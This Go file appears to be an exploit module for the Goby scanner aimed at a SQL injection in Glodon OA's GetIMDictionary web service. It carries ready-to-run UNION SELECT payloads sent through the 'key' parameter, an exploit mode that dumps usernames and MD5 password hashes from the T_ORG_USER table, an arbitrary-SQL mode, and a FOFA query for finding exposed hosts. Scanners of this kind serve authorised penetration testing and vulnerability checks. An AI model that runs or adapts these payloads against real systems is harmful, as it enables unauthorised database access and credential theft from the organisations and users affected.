package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Glodon OA GetIMDictionary SQL Injection Vulnerability",
    "Description": "<p>Glodon OA was developed by GLOdon Technology Co., LTD. Glodon Technology Co., Ltd. provides customers with digital solutions for the whole life cycle of buildings.</p><p>At present, there is an SQL injection vulnerability in Glodon OA. Attackers can use this vulnerability to obtain information in the database (such as administrator background password and site user personal information) and further obtain server system permissions.</p>",
    "Product": "广联达OA",
    "Homepage": "https://www.glodon.com/",
    "DisclosureDate": "2023-08-11",
    "PostTime": "2023-08-12",
    "Author": "Sanyuee1@163.com",
    "FofaQuery": "body=\"GTPTDT.ASPX\"",
    "GobyQuery": "body=\"GTPTDT.ASPX\"",
    "Level": "3",
    "Impact": "<p>In addition to using SQL injection vulnerability to obtain information in the database (for example, administrator background password, site user personal information), attackers can further obtain server system permissions.</p>",
    "Recommendation": "<p>1. Strict incoming filtering of parameters with loopholes.</p><p>2. Deploy the Web application firewall to monitor database operations.</p><p>3. Disable public network access to the system if necessary.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "sql,sqlPoint,getPassword",
            "show": ""
        },
        {
            "name": "uid",
            "type": "input",
            "value": "1",
            "show": "attackType=getPassword"
        },
        {
            "name": "sql",
            "type": "input",
            "value": " UNION ALL SELECT top 1 concat(F_CODE,':',F_PWD_MD5) from T_ORG_USER ",
            "show": "attackType=sql"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "<?xml",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "广联达 OA GetIMDictionary SQL 注入漏洞",
            "Product": "广联达OA",
            "Description": "<p>广联达 OA 由广联达科技股份有限公司开发，广联达科技股份有限公司为客户提供建筑全生命周期的数字化解决方案等。<br></p><p>当下广联达 OA 存在 SQL 注入漏洞，攻击者可利用该漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息），进一步获取服务器系统权限。</p>",
            "Recommendation": "<p>1、对存在漏洞的参数进行严格的传入过滤。</p><p>2、部署Web应用防火墙，对数据库操作进行监控。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，存在可能进一步获取服务器系统权限。</p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "Glodon OA GetIMDictionary SQL Injection Vulnerability",
            "Product": "广联达OA",
            "Description": "<p>Glodon OA was developed by GLOdon Technology Co., LTD. Glodon Technology Co., Ltd. provides customers with digital solutions for the whole life cycle of buildings.</p><p>At present, there is an SQL injection vulnerability in Glodon OA. Attackers can use this vulnerability to obtain information in the database (such as administrator background password and site user personal information) and further obtain server system permissions.</p>",
            "Recommendation": "<p>1. Strict incoming filtering of parameters with loopholes.<br></p><p>2. Deploy the Web application firewall to monitor database operations.</p><p>3. Disable public network access to the system if necessary.</p>",
            "Impact": "<p>In addition to using SQL injection vulnerability to obtain information in the database (for example, administrator background password, site user personal information), attackers can further obtain server system permissions.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10821"
}`

	sendPayloadGsjnD659 := func(hostInfo *httpclient.FixUrl, cfgData string) (*httpclient.HttpResponse, bool) {
		uri := "/Webservice/IM/Config/ConfigService.asmx/GetIMDictionary"
		cfg := httpclient.NewPostRequestConfig(uri)
		cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		cfg.Data = cfgData
		resp, err := httpclient.DoHttpRequest(hostInfo, cfg)
		if err != nil {
			return nil, false
		}
		return resp, true
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			payload := url.QueryEscape(" UNION ALL SELECT CHAR(113)+CHAR(106)+CHAR(122)+CHAR(118)+CHAR(113)+CHAR(113)+CHAR(83)+CHAR(66)+CHAR(107)+CHAR(103)+CHAR(66)+CHAR(114)+CHAR(90)+CHAR(67)+CHAR(79)+CHAR(109)+CHAR(109)+CHAR(101)+CHAR(106)+CHAR(65)+CHAR(106)+CHAR(69)+CHAR(108)+CHAR(108)+CHAR(84)+CHAR(75)+CHAR(87)+CHAR(65)+CHAR(106)+CHAR(117)+CHAR(106)+CHAR(110)+CHAR(82)+CHAR(68)+CHAR(87)+CHAR(113)+CHAR(65)+CHAR(116)+CHAR(70)+CHAR(77)+CHAR(110)+CHAR(117)+CHAR(80)+CHAR(71)+CHAR(85)+CHAR(113)+CHAR(122)+CHAR(107)+CHAR(120)+CHAR(113)--")
			cfgData := "key=1'" + payload
			resp, _ := sendPayloadGsjnD659(hostInfo, cfgData)
			if strings.Contains(resp.Utf8Html, "qjzvqqSBkgBrZCOmmejAjEllTKWAjujnRDWqAtFMnuPGUqzkxq") {
				return true
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			var result string
			attackType := goutils.B2S(ss.Params["attackType"])
			uid := goutils.B2S(ss.Params["uid"])
			sql := goutils.B2S(ss.Params["sql"])
			if attackType == "getPassword" {
				sql = ` UNION ALL SELECT top ` + uid + ` concat(F_CODE,':',F_PWD_MD5) from T_ORG_USER `
			} else if attackType == `sqlPoint` {
				sql = ` UNION ALL SELECT CHAR(113)+CHAR(106)+CHAR(122)+CHAR(118)+CHAR(113)+CHAR(113)+CHAR(83)+CHAR(66)+CHAR(107)+CHAR(103)+CHAR(66)+CHAR(114)+CHAR(90)+CHAR(67)+CHAR(79)+CHAR(109)+CHAR(109)+CHAR(101)+CHAR(106)+CHAR(65)+CHAR(106)+CHAR(69)+CHAR(108)+CHAR(108)+CHAR(84)+CHAR(75)+CHAR(87)+CHAR(65)+CHAR(106)+CHAR(117)+CHAR(106)+CHAR(110)+CHAR(82)+CHAR(68)+CHAR(87)+CHAR(113)+CHAR(65)+CHAR(116)+CHAR(70)+CHAR(77)+CHAR(110)+CHAR(117)+CHAR(80)+CHAR(71)+CHAR(85)+CHAR(113)+CHAR(122)+CHAR(107)+CHAR(120)+CHAR(113)--`
			}
			resp, _ := sendPayloadGsjnD659(expResult.HostInfo, `key=1'`+sql+`--`)
			if resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "result  value=") {
				expResult.Success = true
			}
			re := regexp.MustCompile(`result\s+value="(.+?)"`)
			match := re.FindStringSubmatch(resp.Utf8Html)
			if len(match) > 1 {
				result = match[1]
			} else {
				result = "failed"
			}
			if attackType == "sql" || attackType == "getPassword" {
				expResult.Output = result
			} else if ss.Params["attackType"] == "sqlPoint" {
				expResult.Output = `POST /Webservice/IM/Config/ConfigService.asmx/GetIMDictionary HTTP/1.1
Host:` + expResult.HostInfo.HostInfo + `
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Length: 80
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate
Connection: close
key=1' --
`
				expResult.Success = true
			}
			return expResult
		},
	))
}
